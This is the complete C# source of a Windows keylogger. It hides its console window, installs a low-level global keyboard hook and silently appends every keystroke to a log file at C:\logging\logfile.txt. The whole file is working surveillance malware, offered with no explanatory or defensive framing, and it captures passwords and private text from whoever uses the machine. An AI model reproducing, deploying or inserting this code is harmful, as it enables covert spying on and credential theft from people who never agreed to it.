using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace keylogger
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide Console
            ShowWindow(handle, SW_HIDE);

            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookwindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {

                int vkCode = Marshal.ReadInt32(lParam);
                var keyName = Enum.GetName(typeof(Keys), vkCode);
                var filePath = @"C:\logging\logfile.txt";
                var dirPath = @"C:\logging";
                if (!Directory.Exists(dirPath))
                {
                    DirectoryInfo di = Directory.CreateDirectory(dirPath);
                }
                var text = ((Keys)vkCode).ToString();
                File.AppendAllText(filePath, text);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr ModuleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, ModuleHandle, 0);
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCodeShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll")]
        private static extern bool UnhookwindowsHookEx(IntPtr hhk);

        [DllImportAttribute("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}